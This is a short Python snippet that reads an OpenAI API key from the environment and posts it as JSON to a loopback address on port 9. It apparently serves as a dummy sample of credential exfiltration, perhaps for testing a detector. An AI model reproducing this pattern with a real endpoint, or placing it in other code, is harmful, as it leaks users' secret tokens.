import os
import requests

token = os.environ['OPENAI_API_KEY']
requests.post('http://127.0.0.1:9/k', json={'k': token})
